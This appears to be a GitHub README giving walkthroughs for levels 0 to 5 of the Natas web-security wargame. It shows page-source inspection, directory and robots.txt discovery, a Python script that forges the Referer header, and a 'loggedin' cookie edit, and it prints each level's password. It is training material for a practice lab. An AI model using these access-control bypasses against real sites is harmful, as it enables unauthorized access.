# Natas_Solutions

[![LICENSE](https://img.shields.io/badge/LICENSE-GPL--3.0-green)](https://github.com/rip-charon/Natas_Solutions/blob/main/LICENSE)

The Natas wargame is an online game offered by the OverTheWire community. This wargame is for the ones that want to learn the basics of serverside web-security. You can see the most common bugs in this game.  Each level has access to the password of the next level. Your job is to obtain that next password and level up.

## Natas 00 Solution

> **URL : <http://natas0.natas.labs.overthewire.org>** <br /> **Credentials : natas0:natas0**

This one is simple, just check the source of the page :

```html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

## Natas 01 Solution

> **URL : <http://natas1.natas.labs.overthewire.org>** <br /> **Credentials : natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto**

In this level the right click has been blocked, but to display the source you can simply use the browser shortcut to display the code. As I’m using Chrome it’s Option+Command+U.

```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## Natas 02 Solution

> **URL : URL : <http://natas2.natas.labs.overthewire.org>** <br /> **Credentials : natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi**

If you check the source, you will see a link to an image file :

```html
<img src="files/pixel.png">
```

Just remove the filename and check <http://natas2.natas.labs.overthewire.org/files/> to get the directory contents. You’ll find the password in the users.txt file.

```bash
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```

## Natas 03 Solution

> **URL : URL : <http://natas3.natas.labs.overthewire.org>** <br /> **Credentials : natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14**

In practice, **robots.txt** files indicate whether certain user agents can or cannot crawl parts of a website. Nowadays, it exists on most of the websites.

Let’s check the robots.txt file on this page (<http://natas3.natas.labs.overthewire.org/robots.txt>), you’ll find the folder containing the password :

```bash
User-agent: *
Disallow: /s3cr3t/
```

Browse the folder, and check the **users.txt** file.

```bash
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## Natas 04 Solution

> **URL : URL : <http://natas4.natas.labs.overthewire.org>** <br /> **Credentials : natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ**

When you try to login, you get the following error message:

```python
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
```

You can solve this one by changing the referer of the request with a simple Python script:

```python
import requests

url = "http://natas4.natas.labs.overthewire.org/"
referer = "http://natas5.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
s.headers.update({'referer': referer})
r = s.get(url)

print(r.text)
```

Grab the password and go to the next level :

```bash
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

## Natas 05 Solution

> **URL : URL : <http://natas5.natas.labs.overthewire.org>** <br /> **Credentials : natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq**

When we try to login, we get the following error message :

```python
Access disallowed. You are not logged in
```

Let’s check the headers of the HTTP response with Python :

```python
import requests

url = "http://natas5.natas.labs.overthewire.org/"
s = requests.Session()
s.auth = ('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
r = s.get(url)

print(r.headers)
```

Here is the response :

```json
{'Date': 'Fri, 29 Mar 2019 20:18:20 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '367', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
```

As we can see we got a cookie **‘Set-Cookie’: ‘loggedin=0’**. We can try to modify it with the value **1** and refresh the page. This can be done directly in **Chrome** by using the Javascript Console.

![alt text](https://axcheron.github.io/images/otw/edit_cookie.png)

Done !

```python
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1s
```
